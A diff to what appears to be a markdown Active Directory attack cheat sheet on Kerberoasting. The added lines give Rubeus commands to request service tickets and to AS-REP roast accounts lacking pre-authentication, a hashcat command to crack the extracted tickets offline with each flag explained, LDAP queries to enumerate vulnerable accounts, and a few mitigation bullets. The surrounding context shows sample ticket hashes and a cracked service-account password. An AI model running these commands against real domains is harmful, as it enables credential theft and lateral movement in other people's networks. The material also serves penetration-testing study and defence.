@@ -81,6 +81,9 @@ ServiceAccount2 cifs/appserver2
 
 
 ### -  Request TGS tickets and extract password hash
+
+#### With Rubeus : https://github.com/GhostPack/Rubeus
+
 ```powershell
 PS> .\Rubeus.exe kerberoast /simple /outfile:hashes.txt
  
@@ -103,8 +106,20 @@ $krb5tgs$23$*ServiceAccount1$domain.com$http/webserver1*$45FAD4676AECDDE4C1397BF
 # ... output truncated ... #
 ```
 
-or
+or 
+```powershell
+.\Rubeus.exe kerberoast /outfile:svc-sql.ticket 
+```
 
+>This will request for a ticket for all enabled user accounts with a servicePrincipalName. Here svc-sql.
+
+```powershell
+.\Rubeus.exe asproast /enc:RC4 /outfile:users.tgt
+```
+
+> This will request a TGT (encrypted with RC4-HMAC) for all enabled user accounts with the flag "Kerberos pre-authentication not required".
+
+or
 
 ```powershell
 #Get TGS in memory from a single user
@@ -143,6 +158,13 @@ $krb5tgs$23$*USER$DOMAIN$http/webserver1*$e556af133a0ca7f310381a7294099034$53db1
  
 # ServiceAccount1 has a password of: P@ssword!23
 ```
+
+.\hashcat32.exe -a 0 -m 13100 C:\Tools\Ghostpack\svc-sql.ticket passwords.lst -o svc-sql.txt -O
+
+- **-a 0** is for dictionary attack, on our case the dictionary is the file **passwords.lst**
+- **-m 13100** is to tell hashcat that we are doing a TGS Kerberos ticket, in our case saved in this location **C:\Tools\Ghostpack\svc-sql.ticket**
+- **-o svc-sql.txt** will save the result with the actual password in a local txt file
+- **-O** is to run hashcat is optimized kernel mode as we don't have a lot of resources on our virtual machine
 
 ### - Use priviledge to further obj
 
@@ -184,3 +206,11 @@ Use for lateral movement
 	- Most importantly, ticket encryption type is 0x17
 - Service Account Passwords should be hard to guess (greater than 25 characters)
 - Use Managed Service Accounts (Automatic change of password periodically and delegated SPN Management)
+- Ensure the conditions for AES256 are met
+- Use long and complex passwords for service accounts or gMSA
+
+#### Enumerate accounts with DONT_REQ_PREAUTH
+(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556. 1.4.803:=4194304))
+
+#### LDAP query to search for user with SPN
+(&(objectCategory=person)(servicePrincipalName=*))
